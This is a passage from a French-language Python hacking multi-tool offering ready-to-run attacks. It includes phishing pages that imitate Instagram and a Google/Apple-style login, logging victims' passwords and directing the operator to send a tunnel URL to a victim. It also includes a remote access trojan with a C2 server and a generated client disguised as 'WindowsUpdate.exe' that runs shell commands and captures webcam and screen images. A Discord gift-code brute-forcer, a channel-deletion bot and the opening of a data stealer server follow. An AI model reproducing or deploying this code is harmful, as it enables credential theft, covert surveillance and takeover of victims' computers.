                                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                            </svg>
                            Se connecter avec Google
                        </button>

                        <button class="social-btn">
                            <svg viewBox="0 0 24 24" fill="currentColor">
                                <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                            </svg>
                            Se connecter avec Apple
                        </button>
                    </div>

                    <div class="divider">
                        <span>ou</span>
                    </div>

                    <form method="post" class="login-form">
                        <div class="input-group">
                            <input type="text" name="username" placeholder="Username or email" id="username">
                        </div>
                        <div class="input-group">
                            <input type="password" name="password" placeholder="Password" id="password">
                        </div>
                        <button type="submit" class="login-btn">Se connecter</button>
                    </form>

                    <button type="button" class="forgot-password" style="margin-top: 20px;">Mot de passe oublié ?</button>

                    <div class="signup-section">
                        Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
                    </div>
                </div>
            </div>
        </body>
        </html>
            '''

        def get_client_ip():
            if 'X-Forwarded-For' in request.headers:
                return request.headers['X-Forwarded-For'].split(',')[0]
            return request.remote_addr

        @app.route('/capture_ip', methods=['GET'])
        def capture_ip():
            client_ip = request.args.get('ip')
            print(f"Client Public IP: {client_ip}")
            return {'ip': client_ip}, 200

        @app.route('/', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                username = request.form.get('username')
                password = request.form.get('password')
                print(f"Username/Email: {username}")
                print(f"Password: {password}")
                return "ERROR 404"
            return render_template_string(html_contenta)

        if __name__ == '__main__':    
            ngrok_auth_token = input("Entrez votre jeton d'authentification ngrok : ")
            ngrok.set_auth_token(ngrok_auth_token)
            port = 5000
            ngrok_tunnel = ngrok.connect(port)
            public_url = ngrok_tunnel.public_url
            print(f"Tunnel public disponible à l'adresse : {public_url}")
            print("Envoyez l'URL suivante à votre victime :")
            print(public_url)
            app.run(host='0.0.0.0', port=port, debug=False)        

if menu_choice == "5":
    os.system('cls' if os.name == 'nt' else 'clear')
    contact = """
    ╔══╗         ╔╗                          ╔═══╗╔╗        ╔╗            
    ╚╣╠╝        ╔╝╚╗                         ║╔═╗║║║        ║║            
     ║║ ╔═╗ ╔══╗╚╗╔╝╔══╗ ╔══╗╔═╗╔══╗ ╔╗╔╗    ║╚═╝║║╚═╗╔╗╔══╗║╚═╗╔╗╔═╗ ╔══╗
     ║║ ║╔╗╗║══╣ ║║ ╚ ╗║ ║╔╗║║╔╝╚ ╗║ ║╚╝║    ║╔══╝║╔╗║╠╣║══╣║╔╗║╠╣║╔╗╗║╔╗║
    ╔╣╠╗║║║║╠══║ ║╚╗║╚╝╚╗║╚╝║║║ ║╚╝╚╗║║║║    ║║   ║║║║║║╠══║║║║║║║║║║║║╚╝║
    ╚══╝╚╝╚╝╚══╝ ╚═╝╚═══╝╚═╗║╚╝ ╚═══╝╚╩╩╝    ╚╝   ╚╝╚╝╚╝╚══╝╚╝╚╝╚╝╚╝╚╝╚═╗║
                         ╔═╝║              Need ngrok                 ╔═╝║
                         ╚══╝                                         ╚══╝
    """
    print_violet_white_gradient(contact)  
    app = Flask(__name__)

    html_contenta = '''
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #000;
                color: #fff;
                display: flex;
                flex-direction: column;
                min-height: 100vh;
            }

            .container {
                display: flex;
                justify-content: center;
                align-items: center;
                flex: 1;
                padding: 20px;
                gap: 80px;
            }

            .images-section {
                position: relative;
                width: 450px;
                height: 500px;
            }

            .images-section img {
                width: 100%;
                height: 100%;
                object-fit: contain;
            }

            .login-section {
                width: 350px;
            }

            .logo {
                font-family: 'Brush Script MT', cursive;
                font-size: 52px;
                text-align: center;
                margin-bottom: 40px;
                font-weight: 400;
                letter-spacing: 1px;
            }

            .login-form {
                display: flex;
                flex-direction: column;
                gap: 8px;
                padding-left: 95px;
                padding-right: 10px;
            }

            input {
                background-color: transparent;
                border: 1px solid #363636;
                border-radius: 3px;
                padding: 12px 10px;
                color: #fff;
                font-size: 13px;
                outline: none;
            }

            input::placeholder {
                color: #737373;
            }

            input:focus {
                border-color: #555;
            }

            .login-btn {
                background-color: #0095f6;
                color: #fff;
                border: none;
                border-radius: 8px;
                padding: 12px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                margin-top: 12px;
                margin-left: -32px;
                margin-right: 30px;
            }

            .login-btn:hover {
                background-color: #1877f2;
            }

            .divider {
                display: flex;
                align-items: center;
                margin: 20px 0;
                color: #737373;
                font-size: 13px;
                font-weight: 600;
            }

            .divider::before,
            .divider::after {
                content: '';
                flex: 1;
                height: 1px;
                background-color: #363636;
            }

            .divider::before {
                margin-right: 18px;
            }

            .divider::after {
                margin-left: 18px;
            }

            .facebook-login {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                color: #0095f6;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                margin-bottom: 20px;
            }

            .facebook-icon {
                width: 20px;
                height: 20px;
                background-color: #0095f6;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #fff;
                font-weight: bold;
            }

            .forgot-password {
                text-align: center;
                color: #a8a8a8;
                font-size: 12px;
                margin-bottom: 20px;
            }

            .report-text {
                text-align: center;
                color: #a8a8a8;
                font-size: 12px;
                line-height: 1.5;
                margin-bottom: 20px;
            }

            .report-text a {
                color: #0095f6;
                text-decoration: none;
            }

            .signup-text {
                text-align: center;
                color: #fff;
                font-size: 14px;
            }

            .signup-text a {
                color: #0095f6;
                text-decoration: none;
                font-weight: 600;
            }

            footer {
                padding: 30px 20px;
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 15px;
            }

            .footer-links {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 15px;
                font-size: 12px;
            }

            .footer-links a {
                color: #737373;
                text-decoration: none;
            }

            .footer-links a:hover {
                text-decoration: underline;
            }

            .footer-bottom {
                display: flex;
                gap: 20px;
                align-items: center;
                font-size: 12px;
                color: #737373;
            }

            .language-selector {
                background: transparent;
                border: none;
                color: #737373;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="images-section">
                <img src="https://i.postimg.cc/8chnPvx8/insta.png" alt="Instagram Photos">
            </div>

            <div class="login-section">
                <div class="logo">Instagram</div>
                
                <form method="post" class="login-form">
                    <div class="input-group">
                        <input type="text" name="username" placeholder="Username or email" id="username">
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" placeholder="Password" id="password">
                    </div>
                    <button type="submit" class="login-btn">Se connecter</button>
                </form>

                <div class="divider">OU</div>

                <div class="facebook-login">
                    <div class="facebook-icon">f</div>
                    <span>Se connecter avec Facebook</span>
                </div>

                <div class="forgot-password">Mot de passe oublié ?</div>

                <div class="report-text">
                    Vous pouvez également <a href="#">signaler le contenu que vous pensez illégal</a> dans votre pays sans vous connecter.
                </div>

                <div class="signup-text">
                    Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
                </div>
            </div>
        </div>

        <footer>
            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">À propos</a>
                <a href="#">Blog</a>
                <a href="#">Emplois</a>
                <a href="#">Aide</a>
                <a href="#">API</a>
                <a href="#">Confidentialité</a>
                <a href="#">Paramètres des cookies</a>
                <a href="#">Conditions</a>
                <a href="#">Lieux</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Meta AI</a>
                <a href="#">Articles de Meta AI</a>
                <a href="#">Threads</a>
                <a href="#">Importation des contacts et non-utilisateurs</a>
                <a href="#">Meta Verified</a>
                <a href="#">Résilier des contrats ici</a>
            </div>
            <div class="footer-bottom">
                <select class="language-selector">
                    <option>Français</option>
                    <option>English</option>
                </select>
                <span>© 2025 Instagram par Meta</span>
            </div>
        </footer>
    </body>
    </html>
    '''
    def get_client_ip():
        if 'X-Forwarded-For' in request.headers:
            return request.headers['X-Forwarded-For'].split(',')[0]
        return request.remote_addr

    @app.route('/capture_ip', methods=['GET'])
    def capture_ip():
        client_ip = request.args.get('ip')
        print(f"Client Public IP: {client_ip}")
        return {'ip': client_ip}, 200

    @app.route('/', methods=['GET', 'POST'])
    def login():
        if request.method == 'POST':
            username = request.form.get('username')
            password = request.form.get('password')
            print(f"Username/Email: {username}")
            print(f"Password: {password}")
            return "ERROR 404"
        return render_template_string(html_contenta)

    if __name__ == '__main__':
        
        ngrok_auth_token = input("Entrez votre jeton d'authentification ngrok : ")
        ngrok.set_auth_token(ngrok_auth_token)
        port = 5000      
        ngrok_tunnel = ngrok.connect(port)
        public_url = ngrok_tunnel.public_url
        print(f"Tunnel public disponible à l'adresse : {public_url}")         
        print("Envoyez l'URL suivante à votre victime :")
        print(public_url)     
        app.run(host='0.0.0.0', port=port, debug=False)


if menu_choice == "6":
    os.system('cls' if os.name == 'nt' else 'clear')
    mini = """
                             ..--=======-.
                          .-**=:.......++.
                         :*=.        .*+. 
                        -*:        --.+-. 
                       .*=.        :*:+=. 
                       -*.       .   .+=. 
                       -*.      :*=. .++. 
                       -*.      .*+*+=++. 
         ..::::::::::::=*.      .*-       
    ..-+**+-::::::::::::.       .*-       
   :++::++.                     .+=       Mini Rat By AltWolf
 .:*-.=**-                      .+=          Version V1.1.1
 .+-.=*:*:                      .+=.      
 -*.:*::*.                       ++.      
 =***- -*.   .=************+.    =+.      
       =+.  .=+.           =+.   -*.      
      .++-:.=+.            .++..-=*:      
    .+*-::-**:              .+*+:::+*:    
   .=+.    .+=              :*:.   .-*:   
   .++.    .+=              :*:     :*:   
    .++:..:++.              .=*-...-*-.   
     .:=++=:.                ..-=+=-..
    """
    print_violet_white_gradient(mini)
    app = Flask(__name__)
    received_files = {}
    command_queue = {}  
    results_queue = {}  

    @app.route('/view/<filename>')
    def view_file(filename):
        if filename in received_files:
            return send_file(received_files[filename], mimetype='image/jpeg')
        return "File not found", 404

    @app.route('/register', methods=['POST'])
    def register_client():
        data = request.json
        client_id = data.get('client_id')
        client_info = data.get('info', 'Unknown')
        
        if client_id not in command_queue:
            command_queue[client_id] = {"command": None, "executed": False}
            results_queue[client_id] = {"result": None, "retrieved": True}
            print(f"\n{'='*60}")
            print(f" NOUVEAU CLIENT CONNECTÉ: {client_id}")
            print(f" Info: {client_info}")
            print(f"{'='*60}\n")
        
        return jsonify({"status": "registered"})

    @app.route('/get_command', methods=['POST'])
    def get_command():
        data = request.json
        client_id = data.get('client_id')
        
        if client_id in command_queue:
            cmd_data = command_queue[client_id]
            if cmd_data["command"] and not cmd_data["executed"]:
                cmd_data["executed"] = True
                return jsonify({"command": cmd_data["command"]})
        
        return jsonify({"command": None})

    @app.route('/send_result', methods=['POST'])
    def send_result():
        data = request.json
        client_id = data.get('client_id')
        result = data.get('result', '')
        result_type = data.get('type', 'text')
        
        if client_id in results_queue:
            if result_type == 'file':
                file_data = base64.b64decode(result)
                filename = f"{client_id}_{int(time.time())}.jpg"
                filepath = os.path.join(os.getcwd(), filename)
                
                with open(filepath, 'wb') as f:
                    f.write(file_data)
                
                received_files[filename] = filepath
                results_queue[client_id] = {
                    "result": f"Fichier reçu: {filename}",
                    "retrieved": False,
                    "file": filename
                }
            else:
                results_queue[client_id] = {
                    "result": result,
                    "retrieved": False
                }
        
        return jsonify({"status": "received"})

    def start_flask(port):
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)

    def command_interface(flask_url):
        active_clients = []
        current_client = None
        
        print("\n" + "="*60)
        print("INTERFACE DE COMMANDE")
        print("="*60)
        print("Tapez 'clients' pour voir les clients connectés")
        print("Tapez 'select <id>' pour sélectionner un client")
        print("Tapez 'help' pour voir les commandes disponibles")
        print("="*60 + "\n")
        
        while True:
            try:
                
                active_clients = [cid for cid in command_queue.keys()]
                
                if current_client:
                    prompt = f"[{current_client}] $ "
                else:
                    prompt = "RAT $ "
                
                user_input = input(prompt).strip()
                
                if not user_input:
                    continue
                
                if user_input.lower() == 'clients':
                    if active_clients:
                        print("\n Clients connectés:")
                        for i, cid in enumerate(active_clients, 1):
                            marker = "" if cid == current_client else "  "
                            print(f"{marker} {i}. {cid}")
                    else:
                        print(" Aucun client connecté")
                    continue
                
                if user_input.lower().startswith('select '):
                    client_id = user_input[7:].strip()
                    if client_id in active_clients:
                        current_client = client_id
                        print(f"✅ Client sélectionné: {current_client}")
                    else:
                        print(f" Client '{client_id}' non trouvé")
                    continue
                
                if user_input.lower() == 'help':
                    print("\n💻 Commandes disponibles:")
                    print("   • clients         : Liste des clients")
                    print("   • select <id>     : Sélectionner un client")
                    print("   • cmd <commande>  : Exécuter une commande shell")
                    print("   • sysinfo         : Informations système")
                    print("   • processes       : Liste des processus")
                    print("   • webcam          : Prendre une photo webcam")
                    print("   • screen          : Prendre un screenshot")
                    print("   • disconnect      : Déconnecter le client actuel")
                    print("   • help            : Afficher cette aide")
                    continue
                
                if user_input.lower() == 'disconnect':
                    if current_client:
                        command_queue[current_client]["command"] = "exit"
                        command_queue[current_client]["executed"] = False
                        print(f" Déconnexion de {current_client}")
                        current_client = None
                    continue
                
                if not current_client:
                    print(" Sélectionne d'abord un client avec 'select <id>'")
                    continue
                
                
                command_queue[current_client]["command"] = user_input
                command_queue[current_client]["executed"] = False
                results_queue[current_client]["retrieved"] = True
                
                print(" Commande envoyée, en attente du résultat...")
                
                
                timeout = 30
                start_time = time.time()
                while time.time() - start_time < timeout:
                    if not results_queue[current_client]["retrieved"]:
                        result = results_queue[current_client]["result"]
                        results_queue[current_client]["retrieved"] = True
                        
                        if "file" in results_queue[current_client]:
                            filename = results_queue[current_client]["file"]
                            print(f"\n{result}")
                            print(f" Voir à: {flask_url}/view/{filename}\n")
                        else:
                            print(f"\n Résultat:\n{result}\n")
                        break
                    time.sleep(0.5)
                else:
                    print("  Timeout - pas de réponse du client")
                
            except KeyboardInterrupt:
                print("\n\n  Arrêt...")
                break
            except Exception as e:
                print(f" Erreur: {e}")

    def install_dependencies():
        print("\n Vérification des dépendances...")
        
        dependencies = ['pyngrok', 'flask', 'pyinstaller', 'requests']
        
        for dep in dependencies:
            try:
                __import__(dep)
                print(f"✅ {dep} déjà installé")
            except ImportError:
                print(f"✅ Installation de {dep}...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep, "-q"])
                print(f"✅ {dep} installé avec succès")

    def create_client_file(server_url):        
        client_code = f'''import requests
import subprocess
import os
import time
import sys
import base64
import platform
import uuid

SERVER_URL = "{server_url}"
CLIENT_ID = f"{{platform.node()}}_{{str(uuid.uuid4())[:8]}}"

def take_webcam_photo():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            filename = "temp_webcam.jpg"
            cv2.imwrite(filename, frame)
            cap.release()
            return filename
        cap.release()
    except:
        pass
    return None

def take_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        filename = "temp_screen.jpg"
        screenshot.save(filename, 'JPEG')
        return filename
    except:
        pass
    return None

def get_system_info():
    try:
        info = f"System: {{platform.system()}}\\n"
        info += f"Node: {{platform.node()}}\\n"
        info += f"Release: {{platform.release()}}\\n"
        info += f"Version: {{platform.version()}}\\n"
        info += f"Machine: {{platform.machine()}}\\n"
        info += f"Processor: {{platform.processor()}}"
        return info
    except:
        return "Unable to get system info"

def list_processes():
    try:
        if os.name == 'nt':
            output = subprocess.check_output("tasklist", shell=True)
            return output.decode('cp1252', errors='ignore')
        else:
            output = subprocess.check_output("ps aux", shell=True)
            return output.decode('utf-8', errors='ignore')
    except:
        return "Failed to list processes"

def register():
    try:
        info = get_system_info()
        response = requests.post(
            f"{{SERVER_URL}}/register",
            json={{"client_id": CLIENT_ID, "info": info}},
            timeout=10
        )
        return response.status_code == 200
    except:
        return False

def get_command():
    try:
        response = requests.post(
            f"{{SERVER_URL}}/get_command",
            json={{"client_id": CLIENT_ID}},
            timeout=10
        )
        data = response.json()
        return data.get("command")
    except:
        return None

def send_result(result, result_type="text"):
    try:
        requests.post(
            f"{{SERVER_URL}}/send_result",
            json={{
                "client_id": CLIENT_ID,
                "result": result,
                "type": result_type
            }},
            timeout=30
        )
    except:
        pass

def execute_command(command):
    if command == "exit":
        return None
    
    if command == "webcam":
        filename = take_webcam_photo()
        if filename and os.path.exists(filename):
            with open(filename, 'rb') as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            send_result(encoded, "file")
            os.remove(filename)
        else:
            send_result("Error: Unable to capture webcam")
    
    elif command == "screen":
        filename = take_screenshot()
        if filename and os.path.exists(filename):
            with open(filename, 'rb') as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            send_result(encoded, "file")
            os.remove(filename)
        else:
            send_result("Error: Unable to capture screen")
    
    elif command.startswith("cmd "):
        cmd = command[4:]
        try:
            if sys.platform == 'win32':
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                output = output.decode('cp1252', errors='ignore')
            else:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                output = output.decode('utf-8', errors='ignore')
            send_result(output)
        except Exception as e:
            send_result(f"Error: {{str(e)}}")
    
    elif command == "sysinfo":
        info = get_system_info()
        send_result(info)
    
    elif command == "processes":
        processes = list_processes()
        send_result(processes)
    
    else:
        send_result("Unknown command")

def main():
    # S'enregistrer auprès du serveur
    while not register():
        time.sleep(5)
    
    # Boucle principale
    while True:
        try:
            command = get_command()
            
            if command:
                if command == "exit":
                    break
                execute_command(command)
            
            time.sleep(2)
            
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    # Masquer la console sur Windows
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    main()
    '''
        
        
        with open("client.py", "w", encoding='utf-8') as f:
            f.write(client_code)
        print(f"\n{'='*60}")
        print("✅ FICHIER CLIENT CRÉÉ: client.py")
        print(f"{'='*60}")
        print("\n🔨 Génération de l'exécutable...")
        try:
            result = subprocess.run([
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--name=WindowsUpdate",
                "client.py"
            ], capture_output=True, text=True)
            
            exe_path = os.path.join("dist", "WindowsUpdate.exe")
            if os.path.exists(exe_path):
                print(f"✅ EXE créé avec succès: {exe_path}")
                print(f"\n{'='*60}")
                print(f" Serveur: {server_url}")
                print(f" Fichier à distribuer: dist/WindowsUpdate.exe")
                print(f"{'='*60}\n")
            else:
                print(" EXE non trouvé dans dist/")
        except Exception as e:
            print(f" Erreur lors de la création de l'EXE: {e}")

    def setup_ngrok(ngrok_token):
        try:
            from pyngrok import ngrok
            from pyngrok.installer import install_ngrok
            from pyngrok.conf import PyngrokConfig
            import logging

            logging.getLogger('pyngrok').setLevel(logging.ERROR)
            
            print(" Configuration de ngrok...")
            
            pyngrok_config = PyngrokConfig()
            ngrok_path = install_ngrok(pyngrok_config.ngrok_path)
            print(f"✅ Ngrok installé: {ngrok_path}")
            
            pyngrok_config = PyngrokConfig(ngrok_path=ngrok_path, log_event_callback=lambda log: None)
            ngrok.set_auth_token(ngrok_token, pyngrok_config)
            print("✅ Token ngrok configuré")
            
            return pyngrok_config
            
        except Exception as e:
            print(f" Erreur configuration ngrok: {e}")
            return None

    def main():
        print("\n" + "="*60)
        print("      MINI RAT ^^     ")
        print("="*60 + "\n")

        import logging
        logging.getLogger('pyngrok').setLevel(logging.CRITICAL)
        logging.getLogger('werkzeug').setLevel(logging.ERROR)

        install_dependencies()
        
        from pyngrok import ngrok

        ngrok_token = input("\n Token ngrok : ").strip()
        if not ngrok_token:
            print("Token ngrok requis!")
            return
        
        pyngrok_config = setup_ngrok(ngrok_token)
        if not pyngrok_config:
            return

        port = int(input("Port Flask [5000]: ") or "5000")

        print("\n Démarrage de Flask...")
        flask_thread = threading.Thread(target=start_flask, args=(port,))
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)

        print(" Création du tunnel HTTP...")
        try:
            tunnel = ngrok.connect(port, "http", pyngrok_config=pyngrok_config)
            public_url = tunnel.public_url

            print("\n" + "="*60)
            print("✅ TUNNEL HTTP NGROK CRÉÉ!")
            print("="*60)
            print(f" URL publique: {public_url}")
            print("="*60 + "\n")

            create_client_file(public_url)

            print("\n✅ Serveur prêt! Les clients vont se connecter automatiquement...")
            print(f" URL du serveur: {public_url}")
            print(f" Fichier à distribuer: dist/WindowsUpdate.exe")
            print(" Appuie sur Ctrl+C pour arrêter\n")
            
            time.sleep(2)
            
          
            command_interface(public_url)

        except Exception as e:
            print(f" Erreur ngrok: {e}")
            import traceback
            traceback.print_exc()
            return

    if __name__ == "__main__":
        try:
            main()
        except KeyboardInterrupt:
            print("\n\n  Arrêt du serveur...")
            sys.exit(0)
        except Exception as e:
            print(f"\n Erreur: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)



if menu_choice == "7":
    os.system('cls' if os.name == 'nt' else 'clear')
    rtyp = """
                                            
          -%%%%%%%%%%%%%%%%%%%%#+:.        
         :@***********************#%=.     
         .=%#####********************%*.   
                 =#****+++++++++*******%-. 
=@%@: .%@@@@@@@@@#***++*@*-::=%%+++*****#= 
#++*+ :%***********++%+.........-%++*****%-    Nitro Generator By AltWolf
....   .......-%**++%:..:-----:...*++*****#          Version V1.0.2
         .-%%%@#**+#=..:-------:..:@++****%
         -%******++#:..---------:..%++****%
         ..-%#****+*+...-------:..:%++****%
            -#****++%-...-----:..:%++******
            .##****++*#:........*#++*****%:
             .#******+++#@%%%@%+++******@: 
              .+%*******+++++++*******#%.  
                .#%*****************#%-    
                  .-@%***********#@*.      
                      .-+*###*+=.. 
            
            """
    print_violet_white_gradient(rtyp)
    green = "\033[92m"
    red = "\033[91m"
    white = "\033[97m"
    reset = "\033[0m"

        
    def Title(text):
        print(f"{white}{text}{reset}")

    def Slow(text):
        for char in text:
            print(char, end='', flush=True)
            time.sleep(0.02)
        print()

        
    def ErrorModule(e):
        print(f"{red}Error: {e}{reset}")

    def ErrorNumber():
        print(f"{red}Invalid number input.{reset}")

    def current_time_hour():
        return time.strftime("[%H:%M:%S]")

    def CheckWebhook(webhook_url):
        try:
            response = requests.get(webhook_url)
            if response.status_code == 200:
                print(f"{green}Webhook URL is valid.{reset}")
            else:
                print(f"{red}Webhook URL is invalid.{reset}")
        except Exception as e:
            print(f"{red}Error validating webhook URL: {e}{reset}")

        
    def send_webhook(webhook_url, url_nitro):
        payload = {
            'embeds': [{
                'title': 'Nitro Valid!',
                'description': f"**Nitro:**\n```{url_nitro}```",
                'color': 65280,  
            }],
            'username': 'Nitro Generator',
            'avatar_url': ''
        }

        headers = {
            'Content-Type': 'application/json'
        }

        try:
            requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        except Exception as e:
            ErrorModule(e)

        
    def nitro_check(webhook, webhook_url):
        code_nitro = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        url_nitro = f'https://discord.gift/{code_nitro}'

        try:
            response = requests.get(f'https://discord.com/api/v6/entitlements/gift-codes/{code_nitro}?with_application=false&with_subscription_plan=true', timeout=1)
            if response.status_code == 200:
                if webhook:
                    send_webhook(webhook_url, url_nitro)
                print(f"{green}{current_time_hour()} Valid Nitro: {white}{url_nitro}{reset}")
            else:
                print(f"{red}{current_time_hour()} Invalid Nitro: {white}{url_nitro}{reset}")
        except Exception as e:
            ErrorModule(e)

        
    def request(threads_number, webhook, webhook_url):
        threads = []
        for _ in range(threads_number):
            t = threading.Thread(target=nitro_check, args=(webhook, webhook_url))
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()

    def main():
        Title("Discord Nitro Generator")

        webhook = input(f"Webhook ? (y/n) -> ").lower()

        if webhook in ['y', 'yes']:
            webhook_url = input(f"Webhook URL -> ")
            CheckWebhook(webhook_url)
        else:
            webhook_url = None

        try:
            threads_number = int(input("Nombre de threads -> "))
        except ValueError:
            ErrorNumber()
            return

        while True:
            request(threads_number, webhook in ['y', 'yes'], webhook_url)

    if __name__ == "__main__":
        try:
            main()
        except Exception as e:
            ErrorModule(e)




if menu_choice == "8":
    os.system('cls' if os.name == 'nt' else 'clear')
    gamebot = """

    You are about to open another one of my tools called GameBot.
    The purpose of GameBot is that, once you enter your bot’s token and the required information,
    GameBot will automatically delete the channels. Be careful with your server.

            """
    print_violet_white_gradient(gamebot)
    input("Press Enter to continue... ")
    os.system('cls' if os.name == 'nt' else 'clear')
    def print_yellow_to_orange_gradient(text):
            
        gradient = [(255, 255, 0), (255, 165, 0)]
        gradient_step = 1.0 / (len(text) - 1) if len(text) > 1 else 0

        for i, char in enumerate(text):
            ratio = i * gradient_step
            r = int(gradient[0][0] * (1 - ratio) + gradient[1][0] * ratio)
            g = int(gradient[0][1] * (1 - ratio) + gradient[1][1] * ratio)
            b = int(gradient[0][2] * (1 - ratio) + gradient[1][2] * ratio)
                    
                    
            sys.stdout.write(f"\033[38;2;{r};{g};{b}m{char}")
        sys.stdout.write("\033[0m\n")  



    game = """

            ▄▄ •  ▄▄▄· • ▌ ▄ ·. ▄▄▄ .▄▄▄▄·       ▄▄▄▄▄
            ▐█ ▀ ▪▐█ ▀█ ·██ ▐███▪▀▄.▀·▐█ ▀█▪ ▄█▀▄ •██  
            ▄█ ▀█▄▄█▀▀█ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▀▀█▄▐█▌.▐▌ ▐█.▪
            ▐█▄▪▐█▐█▪ ▐▌██ ██▌▐█▌▐█▄▄▌██▄▪▐█▐█▌.▐▌ ▐█▌·
            ·▀▀▀▀  ▀  ▀ ▀▀  █▪▀▀▀ ▀▀▀ ·▀▀▀▀  ▀█▄▀▪ ▀▀▀ 

                    By AltWolf V2.1.1

    """
    print_violet_white_gradient(game)
    import discord
    from discord.ext import commands

            
    async def main():
                
        token = input("Entrez le token du bot : ")
        guild_id = int(input("Entrez l'ID du serveur : "))
        channel_ids = input("Entrez les IDs des salons à supprimer (séparés par des virgules) : ")
        channel_ids = [int(ch.strip()) for ch in channel_ids.split(",")]

        intents = discord.Intents.default()
        intents.message_content = True

        bot = commands.Bot(command_prefix="!", intents=intents)

        @bot.event
        async def on_ready():
            print(f'Bot connecté en tant que {bot.user}')

            guild = bot.get_guild(guild_id)
            if guild is None:
                print("Le serveur n'a pas été trouvé.")
                await bot.close()
                return

                    
            for channel_id in channel_ids:
                channel = guild.get_channel(channel_id)
                if channel:
                    try:
                        await channel.delete()
                        print(f"Salon {channel.name} supprimé avec succès.")
                    except discord.Forbidden:
                        print(f"Permission refusée pour supprimer le salon {channel.name}.")
                    except discord.HTTPException as e:
                        print(f"Erreur HTTP pour supprimer {channel.name}: {e}")
                else:
                    print(f"Salon avec l'ID {channel_id} introuvable.")

                    
            await bot.close()

                
        await bot.start(token)

    if __name__ == "__main__":
        import asyncio
        try:
            asyncio.run(main())
        except RuntimeError:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(main())



if menu_choice == "9":
        os.system('cls' if os.name == 'nt' else 'clear')
        input("This Stealer is a suite of tests. To build, please select the stealer_ngrok file to create the attack file.")
        app = Flask(__name__)
        received_data = []

        @app.route("/data", methods=["POST"])
        def receive_data():
            data = request.json
            received_data.append(data)
            print("Data reçue :", data)
            return jsonify({"status": "ok"})


        def run_flask():
            app.run(port=5000)


        class MainWindow(QMainWindow):

            def __init__(self):
                super().__init__()

                self.setWindowTitle("Server Interface")
                self.resize(600, 400)

                self.ngrok_url = None

                layout = QVBoxLayout()

                self.start_btn = QPushButton("Start ngrok")
                self.build_btn = QPushButton("Build script")

                self.log = QTextEdit()
                self.log.setReadOnly(True)

                layout.addWidget(self.start_btn)
                layout.addWidget(self.build_btn)
                layout.addWidget(self.log)

                container = QWidget()
                container.setLayout(layout)
                self.setCentralWidget(container)

                self.start_btn.clicked.connect(self.start_server)
                self.build_btn.clicked.connect(self.build_script)

                # refresh affichage data
                self.timer = QTimer()
                self.timer.timeout.connect(self.update_log)
                self.timer.start(2000)

            # ---------- START SERVER ----------
            def start_server(self):

                self.log.append("Starting Flask server...")

                threading.Thread(target=run_flask, daemon=True).start()

                self.log.append("Starting ngrok...")

                subprocess.Popen("ngrok http 5000", shell=True)

